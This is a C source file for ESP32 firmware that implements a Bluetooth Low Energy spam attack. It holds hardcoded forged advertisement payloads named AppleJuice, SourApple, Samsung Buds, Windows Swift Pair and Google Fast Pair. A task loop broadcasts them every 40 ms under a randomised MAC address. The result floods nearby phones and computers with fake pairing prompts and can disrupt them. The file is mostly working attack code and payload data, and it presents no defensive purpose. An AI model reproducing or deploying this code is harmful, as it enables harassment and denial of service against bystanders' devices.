// main/ble_spam.c
#include "ble_spam.h"
#include "wifi_sniffer.h"
#include "esp_heap_caps.h"
#include "esp_log.h"
#include "esp_random.h"
#include "freertos/FreeRTOS.h"
#include "freertos/task.h"
#include "nimble/nimble_port.h"
#include "nimble/nimble_port_freertos.h"
#include "host/ble_hs.h"
#include "host/util/util.h"
#include <string.h>

static const char *TAG = "ble_spam";

// NimBLE bring-up needs this much contiguous DMA-capable internal RAM.
// The number is empirical for these sdkconfig values; if you tighten
// the NimBLE buffer counts further you can lower it, if you loosen
// them you must raise it. A failed bring-up at this size is what
// produces "BLE ERR 257" (ESP_ERR_NO_MEM).
#define BLE_MIN_CONTIGUOUS_BYTES  (50 * 1024)

// ---------------------------------------------------------------------------
// Payloads (unchanged)
// ---------------------------------------------------------------------------
static const uint8_t apple_audio[][31] = {
    {0x1e,0xff,0x4c,0x00,0x07,0x19,0x07,0x02,0x20,0x75,0xaa,0x30,0x01,0x00,0x00,
     0x45,0x12,0x12,0x12,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00},
    {0x1e,0xff,0x4c,0x00,0x07,0x19,0x07,0x0e,0x20,0x75,0xaa,0x30,0x01,0x00,0x00,
     0x45,0x12,0x12,0x12,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00},
    {0x1e,0xff,0x4c,0x00,0x07,0x19,0x07,0x0a,0x20,0x75,0xaa,0x30,0x01,0x00,0x00,
     0x45,0x12,0x12,0x12,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00},
    {0x1e,0xff,0x4c,0x00,0x07,0x19,0x07,0x0f,0x20,0x75,0xaa,0x30,0x01,0x00,0x00,
     0x45,0x12,0x12,0x12,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00},
    {0x1e,0xff,0x4c,0x00,0x07,0x19,0x07,0x13,0x20,0x75,0xaa,0x30,0x01,0x00,0x00,
     0x45,0x12,0x12,0x12,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00},
    {0x1e,0xff,0x4c,0x00,0x07,0x19,0x07,0x14,0x20,0x75,0xaa,0x30,0x01,0x00,0x00,
     0x45,0x12,0x12,0x12,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00},
};
#define APPLE_AUDIO_COUNT (sizeof(apple_audio) / sizeof(apple_audio[0]))

static const uint8_t apple_home[][23] = {
    {0x16,0xff,0x4c,0x00,0x04,0x04,0x2a,0x00,0x00,0x00,0x0f,0x05,0xc1,0x01,
     0x60,0x4c,0x95,0x00,0x00,0x10,0x00,0x00,0x00},
    {0x16,0xff,0x4c,0x00,0x04,0x04,0x2a,0x00,0x00,0x00,0x0f,0x05,0xc1,0x06,
     0x60,0x4c,0x95,0x00,0x00,0x10,0x00,0x00,0x00},
    {0x16,0xff,0x4c,0x00,0x04,0x04,0x2a,0x00,0x00,0x00,0x0f,0x05,0xc1,0x20,
     0x60,0x4c,0x95,0x00,0x00,0x10,0x00,0x00,0x00},
    {0x16,0xff,0x4c,0x00,0x04,0x04,0x2a,0x00,0x00,0x00,0x0f,0x05,0xc1,0x0b,
     0x60,0x4c,0x95,0x00,0x00,0x10,0x00,0x00,0x00},
    {0x16,0xff,0x4c,0x00,0x04,0x04,0x2a,0x00,0x00,0x00,0x0f,0x05,0xc1,0x09,
     0x60,0x4c,0x95,0x00,0x00,0x10,0x00,0x00,0x00},
};
#define APPLE_HOME_COUNT (sizeof(apple_home) / sizeof(apple_home[0]))

static const uint8_t sourapple_actions[] = { 0x27, 0x09, 0x02, 0x1e, 0x2b };
#define SOURAPPLE_ACTION_COUNT (sizeof(sourapple_actions) / sizeof(sourapple_actions[0]))

static const uint8_t samsung_buds[] = {
    0x1a, 0xff, 0x75, 0x00,
    0x42, 0x09, 0x81, 0x02, 0x14, 0x15, 0x03, 0x21, 0x01, 0x09,
    0xab, 0x0c, 0x01, 0x46, 0x06, 0x3c, 0xdd, 0x0a, 0x00, 0x00,
    0x00, 0x00, 0xa7, 0x00
};

static const uint8_t windows_swift[] = {
    0x0c, 0xff, 0x06, 0x00, 0x03, 0x00, 0x08,
    'M', '4', 'N', 'T', '1', 'S'
};

static const uint8_t fastpair_models[][7] = {
    {0x06, 0x16, 0x2c, 0xfe, 0x92, 0xbb, 0xbd},
    {0x06, 0x16, 0x2c, 0xfe, 0xcd, 0x82, 0x56},
    {0x06, 0x16, 0x2c, 0xfe, 0xf5, 0x24, 0x94},
    {0x06, 0x16, 0x2c, 0xfe, 0x71, 0x8f, 0xa4},
    {0x06, 0x16, 0x2c, 0xfe, 0x82, 0x1f, 0x06},
    {0x06, 0x16, 0x2c, 0xfe, 0xd4, 0x46, 0xa7},
    {0x06, 0x16, 0x2c, 0xfe, 0x2d, 0x7a, 0x23},
    {0x06, 0x16, 0x2c, 0xfe, 0x0e, 0x30, 0xc3},
    {0x06, 0x16, 0x2c, 0xfe, 0x72, 0xef, 0x8d},
    {0x06, 0x16, 0x2c, 0xfe, 0x72, 0xfb, 0x00},
};
#define FASTPAIR_MODEL_COUNT (sizeof(fastpair_models) / sizeof(fastpair_models[0]))

// ---------------------------------------------------------------------------
// State
// ---------------------------------------------------------------------------
static bool s_running = false;
static volatile bool s_synced = false;
static TaskHandle_t s_task = NULL;
static ble_spam_type_t s_type = BLE_SPAM_APPLEJUICE;
static uint8_t s_sourapple_idx = 0;
static uint8_t s_apple_idx = 0;
static uint8_t s_fastpair_idx = 0;
static uint8_t s_mac[6];

// --- diagnostics ----------------------------------------------------------
static volatile int s_last_err = 0;

typedef enum { NB_UNINIT = 0, NB_INITING, NB_READY } nb_state_t;
static nb_state_t s_nimble_state = NB_UNINIT;

static struct ble_gap_adv_params s_adv_params;

// ---------------------------------------------------------------------------
// NimBLE callbacks
// ---------------------------------------------------------------------------
static int gap_event_cb(struct ble_gap_event *event, void *arg)
{
    (void)event; (void)arg;
    return 0;
}

static void on_sync(void)
{
    int rc = ble_hs_util_ensure_addr(1);      // prefer random
    if (rc != 0) {
        s_last_err = rc;
        return;
    }
    s_synced = true;
}

static void on_reset(int reason)
{
    (void)reason;
    s_synced = false;
}

static void nimble_host_task(void *param)
{
    (void)param;
    nimble_port_run();
    // Intentionally no nimble_port_freertos_deinit() — the host task
    // stays alive for the life of the boot. We never tear down.
}

static esp_err_t nimble_bring_up(void)
{
    if (s_nimble_state == NB_READY)   return ESP_OK;
    if (s_nimble_state == NB_INITING) return ESP_ERR_INVALID_STATE;
    s_nimble_state = NB_INITING;

    esp_err_t ret = nimble_port_init();
    if (ret != ESP_OK) {
        s_last_err = (int)ret;
        s_nimble_state = NB_UNINIT;
        return ret;
    }

    ble_hs_cfg.sync_cb  = on_sync;
    ble_hs_cfg.reset_cb = on_reset;

    nimble_port_freertos_init(nimble_host_task);
    s_nimble_state = NB_READY;
    return ESP_OK;
}

// ---------------------------------------------------------------------------
// Spam task
// ---------------------------------------------------------------------------
static void random_mac(void)
{
    for (int i = 0; i < 6; i++) s_mac[i] = (uint8_t)(esp_random() & 0xFF);
    s_mac[0] = (s_mac[0] & 0xFC) | 0x02;
}

static void next_sourapple(uint8_t *buf, size_t *len)
{
    uint8_t action = sourapple_actions[s_sourapple_idx++ % SOURAPPLE_ACTION_COUNT];
    buf[0] = 0x0f;
    buf[1] = 0xff;
    buf[2] = 0x4c;
    buf[3] = 0x00;
    buf[4] = 0x0f;
    buf[5] = 0x05;
    buf[6] = 0xc1;
    buf[7] = action;
    memset(&buf[8], 0, 9);
    *len = 17;
}

static void spam_task(void *arg)
{
    (void)arg;
    uint8_t buf[31];
    size_t len = 0;

    memset(&s_adv_params, 0, sizeof(s_adv_params));
    s_adv_params.conn_mode = BLE_GAP_CONN_MODE_NON;
    s_adv_params.disc_mode = BLE_GAP_DISC_MODE_GEN;

    for (int i = 0; i < 150 && !s_synced && s_running; i++) {
        vTaskDelay(pdMS_TO_TICKS(20));
    }
    if (!s_synced) {
        if (s_last_err == 0) s_last_err = -2;
        s_running = false;
        s_task = NULL;
        vTaskDelete(NULL);
        return;
    }

    while (s_running) {
        const uint8_t *payload = NULL;

        switch (s_type) {
        case BLE_SPAM_APPLEJUICE:
            if (s_apple_idx & 1) {
                const uint8_t *p = apple_home[(s_apple_idx >> 1) % APPLE_HOME_COUNT];
                len = sizeof(apple_home[0]);
                memcpy(buf, p, len);
            } else {
                const uint8_t *p = apple_audio[(s_apple_idx >> 1) % APPLE_AUDIO_COUNT];
                len = sizeof(apple_audio[0]);
                memcpy(buf, p, len);
            }
            s_apple_idx++;
            payload = buf;
            break;

        case BLE_SPAM_SOURAPPLE:
            next_sourapple(buf, &len);
            payload = buf;
            break;

        case BLE_SPAM_SAMSUNG:
            payload = samsung_buds;
            len = sizeof(samsung_buds);
            break;

        case BLE_SPAM_WINDOWS:
            payload = windows_swift;
            len = sizeof(windows_swift);
            break;

        case BLE_SPAM_FASTPAIR:
            payload = fastpair_models[s_fastpair_idx++ % FASTPAIR_MODEL_COUNT];
            len = sizeof(fastpair_models[0]);
            break;

        default:
            break;
        }

        if (!payload) { vTaskDelay(pdMS_TO_TICKS(50)); continue; }

        ble_gap_adv_stop();

        random_mac();
        ble_hs_id_set_rnd(s_mac);

        int rc = ble_gap_adv_set_data(payload, (int)len);
        if (rc != 0) {
            s_last_err = rc;
            vTaskDelay(pdMS_TO_TICKS(40));
            continue;
        }

        rc = ble_gap_adv_start(BLE_OWN_ADDR_RANDOM, NULL, BLE_HS_FOREVER,
                               &s_adv_params, gap_event_cb, NULL);
        if (rc != 0) s_last_err = rc;

        vTaskDelay(pdMS_TO_TICKS(40));
    }

    ble_gap_adv_stop();
    s_task = NULL;
    vTaskDelete(NULL);
}

// ---------------------------------------------------------------------------
// Public API
// ---------------------------------------------------------------------------
esp_err_t ble_spam_init(void)
{
    return ESP_OK;
}

esp_err_t ble_spam_start(ble_spam_type_t type)
{
    if (s_running) return ESP_OK;
    if (type < 0 || type >= BLE_SPAM_COUNT) return ESP_ERR_INVALID_ARG;

    // On first bring-up we must free Wi-Fi's DMA blocks before NimBLE
    // tries to allocate its own. On subsequent starts NimBLE is already
    // resident, so this is a no-op.
    if (s_nimble_state != NB_READY) {
        esp_err_t wd = wifi_sniffer_deinit();
        if (wd != ESP_OK) {
            s_last_err = (int)wd;
            return wd;
        }

        // Refuse cleanly if the heap cannot supply the contiguous block
        // that esp_bt_controller_init + NimBLE buffers need. Failing
        // here leaves the heap intact; failing inside nimble_port_init()
        // shatters it into 1 KB fragments.
        size_t largest = heap_caps_get_largest_free_block(
            MALLOC_CAP_INTERNAL | MALLOC_CAP_DMA);
        if (largest < BLE_MIN_CONTIGUOUS_BYTES) {
            ESP_LOGE(TAG, "BLE refused: largest block %u < %u",
                     (unsigned)largest, (unsigned)BLE_MIN_CONTIGUOUS_BYTES);
            s_last_err = ESP_ERR_NO_MEM;   // 257
            return ESP_ERR_NO_MEM;
        }

        esp_err_t ret = nimble_bring_up();
        if (ret != ESP_OK) {
            s_last_err = (int)ret;
            return ret;
        }
    }

    s_last_err = 0;
    s_type = type;
    s_sourapple_idx = 0;
    s_apple_idx = 0;
    s_fastpair_idx = 0;
    s_running = true;

    BaseType_t br = xTaskCreate(spam_task, "ble_spam", 4096, NULL, 5, &s_task);
    if (br != pdPASS) {
        s_running = false;
        s_last_err = ESP_ERR_NO_MEM;
        return ESP_ERR_NO_MEM;
    }
    return ESP_OK;
}

esp_err_t ble_spam_stop(void)
{
    if (!s_running) return ESP_OK;
    s_running = false;
    for (int i = 0; i < 20 && s_task != NULL; i++) {
        vTaskDelay(pdMS_TO_TICKS(50));
    }
    ble_gap_adv_stop();

    // NimBLE stays resident for the rest of the boot.
    //
    // The previous version called nimble_tear_down() here. Each teardown
    // plus re-bring-up cycle permanently dropped the largest free block
    // by ~70 KB and never fully recovered it. Once NimBLE has started
    // in a boot, tearing it down leaves the heap fragmented enough that
    // the next start fails at ESP_ERR_NO_MEM (257) with a 0-1 KB largest
    // block showing in STATS.
    //
    // The trade-off is that Wi-Fi cannot be reinitialised after BLE has
    // started in the same boot. That is a hardware constraint on the
    // no-PSRAM S3, not something this code can work around.
    return ESP_OK;
}

bool ble_spam_is_running(void) { return s_running; }

int  ble_spam_last_error(void)  { return s_last_err; }
void ble_spam_clear_error(void) { s_last_err = 0; }

const char *ble_spam_type_name(ble_spam_type_t type)
{
    switch (type) {
    case BLE_SPAM_APPLEJUICE: return "APPLEJUICE";
    case BLE_SPAM_SOURAPPLE:  return "SOURAPPLE";
    case BLE_SPAM_SAMSUNG:    return "SAMSUNG";
    case BLE_SPAM_WINDOWS:    return "WINDOWS";
    case BLE_SPAM_FASTPAIR:   return "FAST PAIR";
    default:                  return "?";
    }
}

int ble_spam_type_count(void) { return BLE_SPAM_COUNT; }